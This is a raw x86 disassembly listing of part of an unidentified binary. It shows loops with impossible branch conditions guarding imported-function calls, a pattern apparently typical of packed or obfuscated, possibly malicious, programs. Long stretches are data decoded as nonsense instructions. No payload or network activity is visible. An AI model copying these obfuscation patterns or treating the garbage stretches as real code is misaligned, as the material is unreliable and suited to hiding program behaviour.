  409aca:	mov    DWORD PTR ds:0x43353f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43353f
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x43353f,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x43362b,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x4335a3,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x4335a3
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x4335a3,edi
  409b0b:	cmp    DWORD PTR ds:0x4335a3,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x4335a3,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x4335a3,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x4335a3
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x4335a3,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433617,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433597
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x43362f
  409b70:	or     edi,DWORD PTR ds:0x43359f
  409b76:	mov    DWORD PTR ds:0x43362f,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x4335a3,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x433673
  409b98:	and    edx,DWORD PTR ds:0x433557
  409b9e:	mov    DWORD PTR ds:0x433673,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x4335af,0x15
  409bb5:	cmp    DWORD PTR ds:0x4335af,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x4335af,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4335af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4335af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4335af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4335af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4335af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4335a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4335a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4335a3,edi
  409c26:	cmp    DWORD PTR ds:0x4335a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4335a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43375d
  409c45:	push   0x433767
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   ecx,DWORD PTR [edx+0x65b23b75],0xca7c7cee
  409c85:	jns    0x409d03
  409c87:	jl     0x409c58
  409c89:	mov    ecx,0x50b92060
  409c8e:	out    0x29,al
  409c90:	inc    esi
  409c91:	xor    eax,0x155d7134
  409c96:	daa    
  409c97:	nop
  409c98:	cmc    
  409c99:	data16 or BYTE PTR [ecx+0x41],0xc6
  409c9e:	cmp    ah,BYTE PTR [esi]
  409ca0:	adc    al,0x6a
  409ca2:	inc    ebp
  409ca3:	or     esp,DWORD PTR [ebx-0x14]
  409ca6:	retf   0xbe2a
  409ca9:	out    0xe5,eax
  409cab:	mov    eax,ds:0x3e9c740e
  409cb0:	or     BYTE PTR [edi+0x2a507820],0xcc
  409cb7:	mov    edx,esi
  409cb9:	adc    bh,ch
  409cbb:	retf   
  409cbc:	push   edi
  409cbd:	cmc    
  409cbe:	mov    bh,dh
  409cc0:	test   eax,0x44bb1035
  409cc5:	xchg   ecx,eax
  409cc6:	jmp    0x46a3:0x2538187
  409ccd:	add    DWORD PTR ds:0x8bf49b5b,eax
  409cd3:	and    al,0xb7
  409cd5:	sbb    ebx,DWORD PTR [ebp+0x1]
  409cd8:	xchg   DWORD PTR [ecx+0x7],edx
  409cdb:	xchg   DWORD PTR [ebp+0x5e],esp
  409cde:	pop    ebx
  409cdf:	xor    al,0x70
  409ce1:	inc    esp
  409ce2:	mov    DWORD PTR [edi+0x25],ecx
  409ce5:	enter  0xd8bd,0x31
  409ce9:	gs in  al,dx
  409ceb:	or     DWORD PTR [ebp+edx*4-0x1b],ecx
  409cef:	shl    bh,0xe7
  409cf2:	xchg   DWORD PTR [ecx+ecx*1],eax
  409cf5:	mov    cl,dh
  409cf7:	xor    eax,0xf6bf056e
  409cfc:	imul   edi,DWORD PTR [eax],0xf962cb9d
  409d02:	call   0x3637:0x16a8e27c
  409d09:	mul    DWORD PTR [ebx+edx*4]
  409d0c:	popa   
  409d0d:	xchg   esi,eax
  409d0e:	add    al,0xaa
  409d10:	sti    
  409d11:	sbb    al,0xee
  409d13:	adc    DWORD PTR [esp+eax*1],eax
  409d16:	stc    
  409d17:	push   ebp
  409d18:	int    0xae
  409d1a:	not    BYTE PTR [edx+0x226c9c4b]
  409d20:	stos   DWORD PTR es:[edi],eax
  409d21:	push   ecx
  409d22:	cmp    ecx,esi
  409d24:	je     0x409cde
  409d26:	arpl   WORD PTR [edx+0x4a],si
  409d29:	aad    0x14
  409d2b:	test   BYTE PTR [bx+di-0x3d],ch
  409d2f:	outs   dx,BYTE PTR ds:[esi]
  409d30:	mov    ch,0xda
  409d32:	add    esp,edi
  409d34:	add    BYTE PTR [esi+esi*8+0x67dc3530],dl
  409d3b:	jge    0x409d01
  409d3d:	daa    
  409d3e:	mov    DWORD PTR [eax+0x6d],ebx
  409d41:	or     eax,0x4916ee8f
  409d46:	cmp    edx,DWORD PTR [esi]
  409d48:	cli    
  409d49:	sti    
  409d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4b:	daa    
  409d4c:	in     al,dx
  409d4d:	lods   eax,DWORD PTR ds:[esi]
  409d4e:	lock adc al,cl
  409d51:	rcr    DWORD PTR [esi+0x2e],1
  409d54:	xchg   edx,eax
  409d55:	es daa 
  409d57:	xchg   edx,eax
  409d58:	pop    esp
  409d59:	inc    edi
  409d5a:	imul   eax,DWORD PTR [esi],0x17445687
  409d60:	xchg   ebx,eax
  409d61:	xor    ebp,ebx
  409d63:	les    ecx,FWORD PTR [eax+eax*8]
  409d66:	mov    edx,0xa42e7e99
  409d6b:	sub    BYTE PTR [edx-0x46],dl
  409d6e:	aaa    
  409d6f:	adc    al,0xf6
  409d71:	dec    ecx
  409d72:	add    eax,0x3751b49
  409d77:	add    esi,eax
  409d79:	cmc    
  409d7a:	mov    bl,0x72
  409d7c:	mov    ds:0x85f48cdf,al
  409d81:	clc    
  409d82:	(bad)  
  409d83:	jns    0x409d5b
  409d85:	ss idiv ch
  409d88:	inc    ebp
  409d89:	sbb    edx,DWORD PTR [edx]
  409d8b:	jb     0x409d99
  409d8d:	sub    al,0xaf
  409d8f:	pop    ds
  409d90:	ja     0x409de5
  409d92:	xchg   DWORD PTR [ebp+0x7],edi
  409d95:	enter  0x389e,0x84
  409d99:	and    al,bl
  409d9b:	int    0x3a
  409d9d:	or     bl,BYTE PTR [ebp+0x6e660b9]
  409da3:	lea    esi,ds:[ebp+0x39]
  409da7:	xchg   esi,eax
  409da8:	mov    edi,0xa442a901
  409dad:	sbb    ah,ch
  409daf:	inc    eax
  409db0:	push   cs
  409db1:	and    cl,ch
  409db3:	add    ebx,DWORD PTR [ecx+esi*1]
  409db6:	jle    0x409e14
  409db8:	jp     0x409d43
  409dba:	mov    ecx,0x4c8ee31f
  409dbf:	gs mov cl,0x7e
  409dc2:	mov    edx,0x64a28184
  409dc7:	sbb    ebx,DWORD PTR [ebp+0x729c78a4]
  409dcd:	push   esp
  409dce:	shl    ebx,cl
  409dd0:	mov    ds:0xfa2751f3,eax
  409dd5:	adc    al,0xa3
  409dd7:	out    dx,al
  409dd8:	xchg   esp,eax
  409dd9:	sbb    DWORD PTR [edi],eax
  409ddb:	adc    eax,0x93521952
  409de0:	sti    
  409de1:	daa    
  409de2:	std    
  409de3:	shl    ch,cl
  409de5:	lods   al,BYTE PTR ds:[esi]
  409de6:	retf   
  409de7:	mov    bl,BYTE PTR [esi+0x231cd865]
  409ded:	fiadd  WORD PTR [edi]
  409def:	mov    BYTE PTR [ebx],bl
  409df1:	test   DWORD PTR [ebx],ebp
  409df3:	imul   ebp,esi,0x23cb6062
  409df9:	or     al,0x4f
  409dfb:	ficom  DWORD PTR [ebp-0x3c]
  409dff:	push   ecx
  409e00:	ret    
  409e01:	(bad)  
  409e02:	cmp    DWORD PTR [ecx],ebp
  409e04:	sbb    dl,BYTE PTR [edi+ebp*8-0x71]
  409e08:	sbb    DWORD PTR [ebp+ebp*4-0x3e0c92cc],ecx
  409e0f:	ja     0x409dd7
  409e11:	and    cl,BYTE PTR [eax-0x31]
  409e14:	pop    edx
  409e15:	sbb    bh,dl
  409e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e18:	jp     0x409e37
  409e1a:	sbb    DWORD PTR [ebx+0x2b],esi
  409e1d:	xor    esi,0x1d26a5f9
  409e23:	push   ebx
  409e24:	sti    
  409e25:	mov    cl,BYTE PTR [edi+0x75eca338]
  409e2b:	inc    ecx
  409e2c:	call   0xc770093d
  409e31:	dec    eax
  409e32:	loopne 0x409e01
  409e34:	enter  0xd43c,0x94
  409e38:	pop    ds
  409e39:	repnz sbb al,0xcf
  409e3c:	aas    
  409e3d:	je     0x409dbf
  409e3f:	jecxz  0x409e57
  409e41:	std    
  409e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e43:	adc    DWORD PTR [ecx-0x16],edi
  409e46:	cmc    
  409e47:	sti    
  409e48:	and    dl,BYTE PTR [ecx]
  409e4a:	push   0x74bea452
  409e4f:	shl    DWORD PTR [edx-0x6e],cl
  409e52:	mul    DWORD PTR [edi-0x42f61cd3]
  409e58:	fabs   
  409e5a:	jmp    0x9df1:0x40f754ba
  409e61:	or     eax,0xf7f64607
  409e66:	rcl    DWORD PTR [ebx+ebp*8],cl
  409e69:	outs   dx,BYTE PTR ds:[esi]
  409e6a:	mov    dh,BYTE PTR [ebx+0x72]
  409e6d:	jmp    0xd9f5:0x99f75116
  409e74:	test   al,0x27
  409e76:	mov    edx,0xd5156e3
  409e7b:	jmp    0x76c6:0xd8b51106
  409e82:	imul   esi,DWORD PTR [esi+0x1c],0x3a
  409e86:	popa   
  409e87:	dec    esi
  409e88:	(bad)  
  409e8a:	sbb    BYTE PTR [edx],dl
  409e8c:	push   edx
  409e8d:	scas   al,BYTE PTR es:[edi]
  409e8e:	adc    eax,0x72f2aed3
  409e93:	inc    ebx
  409e94:	mov    ebp,0xb5d8aab5
  409e99:	pop    eax
  409e9a:	stos   BYTE PTR es:[edi],al
  409e9b:	sub    al,0xbb
  409e9d:	outs   dx,BYTE PTR ds:[esi]
  409e9e:	nop
  409e9f:	mov    BYTE PTR [edx],bl
  409ea1:	test   DWORD PTR [edi+0x78],ebp
  409ea4:	xchg   edi,eax
  409ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea6:	das    
  409ea7:	push   esi
  409ea8:	lock sti 
  409eaa:	bound  edi,QWORD PTR [ebx+0x4c5f22ba]
  409eb0:	jmp    0xaea64a92
  409eb5:	loop   0x409f1a
  409eb7:	xor    ecx,0xfffffff3
  409eba:	inc    edi
  409ebb:	clc    
  409ebc:	adc    DWORD PTR [ebp+edi*2-0x3a98aac2],edi
  409ec3:	mov    DWORD PTR [ebp+0x5335f3de],edx
  409ec9:	xchg   esp,eax
  409eca:	lds    esi,FWORD PTR [ecx-0x29]
  409ecd:	add    cl,BYTE PTR [ebx+0x415d7890]
  409ed3:	in     eax,dx
  409ed4:	ret    0x4243
  409ed7:	xchg   DWORD PTR [ebx+0x37],edx
  409eda:	fst    DWORD PTR [edi+esi*1+0x59]
  409ede:	leave  
  409edf:	fs mov eax,0xeb45283d
  409ee5:	cdq    
  409ee6:	or     DWORD PTR [edx],eax
  409ee8:	shl    DWORD PTR es:[esi-0x743ed209],1
  409eef:	es pop esi
  409ef1:	and    ebx,edi
  409ef3:	daa    
  409ef4:	icebp  
  409ef5:	clc    
  409ef6:	test   eax,0x405217f6
  409efb:	jne    0x409e82
  409efd:	int    0xb8
  409eff:	scas   al,BYTE PTR es:[edi]
  409f00:	xor    al,0x8
  409f02:	mov    edi,0xd0065127
  409f07:	mov    al,0x76
  409f09:	(bad)
  409f0c:	and    BYTE PTR [eax+ebp*2-0x7a0f8c88],ch
  409f13:	xchg   edx,eax
  409f14:	(bad)  
  409f15:	pop    ds
  409f16:	cdq    
  409f17:	icebp  
  409f18:	adc    edx,DWORD PTR [edi]
  409f1a:	fwait
  409f1b:	hlt    
  409f1c:	dec    esi
  409f1d:	aaa    
  409f1e:	pop    edx
  409f1f:	(bad)  
  409f20:	push   edi
  409f21:	les    ebx,FWORD PTR [edi+0x6f]
  409f24:	xor    BYTE PTR [ebp+0x3bea7a64],0x2c
  409f2b:	out    0xae,al
  409f2d:	xchg   edx,eax
  409f2e:	call   0x819a9660
  409f33:	adc    BYTE PTR [ecx],dl
  409f35:	(bad)  
  409f36:	std    
  409f37:	inc    eax
  409f38:	fs jg  0x409ecc
  409f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f3c:	sub    ah,0xd6
  409f3f:	cs jnp 0x409f89
  409f42:	out    0x60,al
  409f44:	and    ebx,DWORD PTR [ebx+0x25]
  409f47:	call   0xa5eb22d7
  409f4c:	push   eax
  409f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f4e:	pop    ss
  409f4f:	pop    esp
  409f50:	fisubr DWORD PTR [esi+0x10]
  409f53:	inc    ebx
  409f54:	jecxz  0x409fc9
  409f56:	clc    
  409f57:	test   eax,0x3fd6b96f
  409f5c:	xchg   esi,eax
  409f5d:	hlt    
  409f5e:	jle    0x409f6a
  409f60:	in     eax,0xc1
  409f62:	sub    BYTE PTR [esi+0x7d],0x80
  409f66:	aad    0xa5
  409f68:	adc    DWORD PTR [ecx],esp
  409f6a:	or     al,0xd1
  409f6c:	fs retf 
  409f6e:	jbe    0x409f20
  409f70:	inc    esp
  409f71:	(bad)  
  409f72:	ins    BYTE PTR es:[edi],dx
  409f73:	mov    ecx,0x5efe09d7
  409f78:	sub    dh,cl
  409f7a:	icebp  
  409f7b:	popf   
  409f7c:	mov    esi,0xc82284e2
  409f81:	call   0x4be6:0x4a25aad0
  409f88:	pop    esp
  409f89:	dec    esp
  409f8a:	mov    al,BYTE PTR [eax+0x7d]
  409f8d:	mov    edx,0x493a94b7
  409f92:	fwait
  409f93:	in     al,dx
  409f94:	or     edi,DWORD PTR [esi]
  409f96:	adc    bh,dh
  409f98:	adc    al,0x47
  409f9a:	sahf   
  409f9b:	fimul  WORD PTR [edi-0x2020b02]
  409fa1:	jge    0x409f8b
  409fa3:	inc    ebp
  409fa4:	aam    0xf0
  409fa6:	jl     0x40a01f
  409fa8:	in     eax,0xa6
  409faa:	adc    DWORD PTR [esi],edx
  409fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fad:	dec    ebp
  409fae:	inc    ecx
  409faf:	(bad)  
  409fb0:	sub    ecx,ecx
  409fb2:	sub    edx,esi
  409fb4:	dec    BYTE PTR [esi]
  409fb6:	mov    ebx,0xdf2deef
  409fbb:	push   edx
  409fbc:	ds pusha 
  409fbe:	outs   dx,BYTE PTR ds:[esi]
  409fbf:	js     0x40a01e
  409fc1:	jno    0x409f6f
  409fc3:	pop    edi
  409fc4:	ins    DWORD PTR es:[edi],dx
  409fc5:	ins    DWORD PTR es:[edi],dx
  409fc6:	retf   0x8bd7
  409fc9:	(bad)  
  409fca:	std    
  409fcb:	sbb    BYTE PTR [eax+0x2f4dfa6a],cl
  409fd1:	pop    esi
  409fd2:	data16 and al,BYTE PTR [ebp-0x5d]
  409fd6:	xlat   BYTE PTR ds:[ebx]
  409fd7:	adc    BYTE PTR [edi-0x32282547],0xc6
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x433623,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x433623
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433623,edx
  40a001:	cmp    DWORD PTR ds:0x433623,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433623,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433673
  40a040:	adc    edx,DWORD PTR ds:0x43362b
  40a046:	mov    DWORD PTR ds:0x433673,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433557,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4335df
  40a075:	xor    DWORD PTR ds:0x4335b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433553,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43366b
  40a094:	xor    DWORD PTR ds:0x43365b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	jecxz  0x40a0c6
  40a0ad:	les    edx,FWORD PTR [edi+0x7c7cea33]
  40a0b3:	retf   0x7c79
  40a0b6:	jl     0x40a123
  40a0b8:	leave  
  40a0b9:	mov    WORD PTR ds:0xc85b5c35,ds
  40a0bf:	mov    WORD PTR [ecx],?
  40a0c1:	sub    eax,0x614c33f9
  40a0c6:	jne    0x40a07c
  40a0c8:	or     edi,DWORD PTR [esi+0x328077bd]
  40a0ce:	sbb    edi,eax
  40a0d0:	or     esi,eax
  40a0d2:	pop    edx
  40a0d3:	dec    BYTE PTR [ebx]
  40a0d5:	cld    
  40a0d6:	xchg   ecx,eax
  40a0d7:	out    0x13,eax
  40a0d9:	retf   
  40a0da:	outs   dx,BYTE PTR ss:[esi]
  40a0dc:	jmp    0x1dab2d9f
  40a0e1:	test   eax,0x97911cad
  40a0e6:	jmp    0x40a06a
  40a0e8:	je     0x40a091
  40a0ea:	ins    DWORD PTR es:[edi],dx
  40a0eb:	add    eax,0xade3f4cd
  40a0f0:	pop    edx
  40a0f1:	jge    0x40a07c
  40a0f3:	dec    eax
  40a0f4:	(bad)  
  40a0f5:	das    
  40a0f6:	int    0xed
  40a0f8:	pop    esp
  40a0f9:	mov    edi,gs
  40a0fb:	sub    ebx,ebp
  40a0fd:	popa   
  40a0fe:	xchg   esp,eax
  40a0ff:	out    0x51,eax
  40a101:	add    eax,0xe5dbdc3e
  40a106:	jg     0x40a149
  40a108:	bound  ecx,QWORD PTR [esi+0x3ff05c8a]
  40a10e:	arpl   cx,di
  40a110:	int3   
  40a111:	adc    ecx,DWORD PTR [ebp+0x22]
  40a114:	mov    ah,0xff
  40a116:	mov    dh,bh
  40a118:	shr    ecx,0xb4
  40a11b:	loop   0x40a174
  40a11d:	fild   QWORD PTR [eax]
  40a11f:	adc    DWORD PTR [ecx],edx
  40a121:	dec    ebp
  40a122:	sub    eax,0x6f5d115b
  40a127:	dec    eax
  40a128:	ss pop cx
  40a12b:	mov    ebx,0x3fc067df
  40a130:	jmp    0xca09ff10
  40a135:	iret   
  40a136:	sbb    al,BYTE PTR [ebp+0x589f0c95]
  40a13c:	adc    esp,DWORD PTR [edx-0x2511fb74]
  40a142:	not    BYTE PTR [edx+0x46]
  40a145:	mov    cl,0xaa
  40a147:	xor    edx,esp
  40a149:	xchg   esp,eax
  40a14a:	out    dx,al
  40a14b:	enter  0xaed0,0xf8
  40a14f:	or     al,0xb5
  40a151:	adc    edx,ebx
  40a153:	mov    ah,BYTE PTR [esi-0x6d651957]
  40a159:	add    al,BYTE PTR [ebp+0x5084fbc0]
  40a15f:	mov    cl,0xd5
  40a161:	pop    es
  40a162:	pop    edx
  40a163:	push   esi
  40a164:	inc    ebp
  40a165:	fdivr  QWORD PTR [ebx]
  40a167:	jp     0x40a176
  40a169:	cwde   
  40a16a:	in     al,dx
  40a16b:	scas   eax,DWORD PTR es:[edi]
  40a16c:	jmp    0x37360adb
  40a171:	je     0x40a1d6
  40a173:	sti    
  40a174:	addr16 test al,0x15
  40a177:	sub    al,0x97
  40a179:	mov    bl,0xe8
  40a17b:	mov    eax,0x44219f68
  40a180:	(bad)  
  40a181:	push   ss
  40a182:	mov    DWORD PTR [ebp-0x6b855387],0xc6b92926
  40a18c:	mov    ebp,0x180777e2
  40a191:	ficom  WORD PTR [edx-0x3dc5d23a]
  40a197:	pop    eax
  40a198:	stc    
  40a199:	inc    ebx
  40a19a:	cmp    DWORD PTR [edi-0x63bb20a9],ecx
  40a1a0:	shl    bl,cl
  40a1a2:	inc    ebp
  40a1a3:	loop   0x40a1bf
  40a1a5:	xor    DWORD PTR ds:[esi+0x49],esi
  40a1a9:	mov    cl,bh
  40a1ab:	js     0x40a1e5
  40a1ad:	cld    
  40a1ae:	imul   esi,DWORD PTR [edi],0xffffffdd
  40a1b1:	push   0xad964b41
  40a1b6:	jno    0x40a15c
  40a1b8:	push   ds
  40a1b9:	fidiv  DWORD PTR [edx+0x5b469af7]
  40a1bf:	or     DWORD PTR [edi+0x68574f0e],0xbaf1323
  40a1c9:	scas   al,BYTE PTR es:[edi]
  40a1ca:	xchg   ecx,eax
  40a1cb:	in     al,0xf0
  40a1cd:	adc    eax,0xc18fc3a
  40a1d3:	aas    
  40a1d4:	stos   BYTE PTR es:[edi],al
  40a1d5:	mov    ebx,0xd4b19597
  40a1da:	ret    
  40a1db:	les    esi,FWORD PTR [edx]
  40a1dd:	mov    al,0x40
  40a1df:	dec    ecx
  40a1e0:	loopne 0x40a1db
  40a1e2:	sub    esi,ebx
  40a1e4:	adc    BYTE PTR [eax+edx*4-0x5bb32f18],al
  40a1eb:	mov    DWORD PTR [esi-0x22],eax
  40a1ee:	in     al,0x91
  40a1f0:	pop    ebx
  40a1f1:	add    eax,0x517593ed
  40a1f6:	imul   edi,esi,0x426d8ba1
  40a1fc:	adc    DWORD PTR [ecx-0x73],eax
  40a1ff:	stc    
  40a200:	xchg   esp,eax
  40a201:	xchg   ecx,eax
  40a202:	inc    eax
  40a203:	out    dx,al
  40a204:	call   FWORD PTR [edx+0x15]
  40a207:	fcomip st,st(7)
  40a209:	mov    eax,ds:0x3fd5d115
  40a20e:	adc    ebp,DWORD PTR [esi]
  40a210:	in     al,0xd5
  40a212:	ret    
  40a213:	jmp    0x59cfd280
  40a218:	idiv   DWORD PTR [ecx-0x6ac867ba]
  40a21e:	xchg   ebp,eax
  40a21f:	xor    bh,BYTE PTR [esi+ebp*4+0x672599e5]
  40a226:	ret    
  40a227:	cmp    DWORD PTR [ecx+0x7c],esi
  40a22a:	nop
  40a22b:	adc    DWORD PTR [ebp-0x1d],esp
  40a22e:	dec    ebp
  40a22f:	jno    0x40a20e
  40a231:	inc    edi
  40a232:	into   
  40a233:	add    DWORD PTR [edx],0x3046c826
  40a239:	mov    ah,0xa5
  40a23b:	xor    BYTE PTR [eax+0x34],cl
  40a23e:	or     DWORD PTR [eax+esi*2-0x76dd471d],edx
  40a245:	jecxz  0x40a24b
  40a247:	jmp    0x40a2aa
  40a249:	jb     0x40a278
  40a24b:	xchg   ebx,eax
  40a24c:	int    0xf7
  40a24e:	push   eax
  40a24f:	dec    edi
  40a250:	enter  0x531f,0xbd
  40a254:	popa   
  40a255:	push   cs
  40a256:	adc    eax,0x12448578
  40a25b:	sub    edx,DWORD PTR [ecx+0x55c733ab]
  40a261:	scas   eax,DWORD PTR es:[edi]
  40a262:	xor    eax,0xd6a14168
  40a267:	out    dx,al
  40a268:	push   0x4d
  40a26a:	push   ecx
  40a26b:	lock jl 0x40a22f
  40a26e:	mov    bh,0x14
  40a270:	test   DWORD PTR [eax-0x3f09c797],ebx
  40a276:	inc    ebp
  40a277:	clc    
  40a278:	js     0x40a2a5
  40a27a:	dec    ebp
  40a27b:	cmp    dh,BYTE PTR [ebp-0x5fc5aec]
  40a281:	dec    ebp
  40a282:	push   ebx
  40a283:	ds cli 
  40a285:	(bad)
  40a289:	sbb    esp,edx
  40a28b:	sub    dl,dl
  40a28d:	mov    eax,ds:0x9d036f09
  40a292:	sub    eax,0x9f8d9cdd
  40a297:	jecxz  0x40a2a3
  40a299:	sar    BYTE PTR [ecx+edi*8-0x6f],0xed
  40a29e:	in     eax,dx
  40a29f:	mov    ss,WORD PTR [esi-0x6e]
  40a2a2:	aad    0x16
  40a2a4:	sbb    BYTE PTR fs:[ebx-0x35a343dd],ah
  40a2ab:	xchg   eax,ebp
  40a2ad:	xchg   ebx,eax
  40a2ae:	stc    
  40a2af:	xchg   DWORD PTR [eax-0xe],edx
  40a2b2:	xor    esi,ecx
  40a2b4:	sbb    al,BYTE PTR es:[ecx-0x36d627a9]
  40a2bb:	fwait
  40a2bc:	daa    
  40a2bd:	cmp    eax,0x92181620
  40a2c2:	retf   
  40a2c3:	scas   eax,DWORD PTR es:[edi]
  40a2c4:	mov    dh,0xbf
  40a2c6:	adc    dl,BYTE PTR [esp+ebp*8-0x5063f96e]
  40a2cd:	mov    eax,0x20f5c4c2
  40a2d2:	dec    edx
  40a2d3:	dec    ebp
  40a2d4:	mov    es:0x1aed13c9,eax
  40a2da:	jmp    0xd5ecf0a7
  40a2df:	bndstx [esi-0x59],bnd2
  40a2e3:	mov    ebx,0x9605e19d
  40a2e8:	cmc    
  40a2e9:	add    ebx,DWORD PTR [ebx]
  40a2eb:	xchg   ecx,eax
  40a2ec:	out    dx,eax
  40a2ed:	std    
  40a2ee:	add    eax,0xb5592126
  40a2f3:	pop    esp
  40a2f4:	jae    0x40a2cf
  40a2f6:	and    eax,0x1e283ba1
  40a2fb:	adc    eax,0xa5c8cac
  40a300:	ins    BYTE PTR es:[edi],dx
  40a301:	mov    ds:0xc0e25de,al
  40a306:	scas   eax,DWORD PTR es:[edi]
  40a307:	out    0x94,eax
  40a309:	jg     0x40a32c
  40a30b:	or     ebx,esp
  40a30d:	out    dx,al
  40a30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a30f:	or     DWORD PTR [edi-0x2de157e],esi
  40a315:	fld    DWORD PTR ds:0x9826db12
  40a31b:	es mov ebx,0xef8bf3db
  40a321:	aam    0xf3
  40a323:	mov    WORD PTR [edx],?
  40a325:	or     BYTE PTR [eax+edi*1-0x67],dh
  40a329:	inc    esi
  40a32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32b:	xchg   ebp,eax
  40a32c:	outs   dx,BYTE PTR es:[esi]
  40a32e:	push   ebp
  40a32f:	sar    DWORD PTR [esi-0x56],cl
  40a332:	stc    
  40a333:	dec    edx
  40a334:	in     eax,0xf2
  40a336:	sub    eax,0x2abc95c7
  40a33b:	scas   al,BYTE PTR es:[edi]
  40a33c:	add    bh,BYTE PTR ds:0x29d2cddf
  40a342:	pop    es
  40a343:	or     ah,BYTE PTR [ebx-0x5c]
  40a346:	ds mov dh,0xdc
  40a349:	add    BYTE PTR [edi-0x61],0x34
  40a34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a34e:	adc    DWORD PTR [edx],edx
  40a350:	repz inc esi
  40a352:	cmp    cl,BYTE PTR [ebx-0x61]
  40a355:	sbb    BYTE PTR [edx+eax*4],cl
  40a358:	jne    0x40a2fe
  40a35a:	jmp    WORD PTR [edi+0x24]
  40a35e:	or     DWORD PTR [eax+0x4d],eax
  40a361:	xor    al,0xe
  40a363:	adc    dh,BYTE PTR [edx-0x2]
  40a366:	(bad)  
  40a367:	addr16 int3 
  40a369:	push   ecx
  40a36a:	push   es
  40a36b:	mov    BYTE PTR ds:0xeb23c65d,bl
  40a371:	jg     0x40a3c6
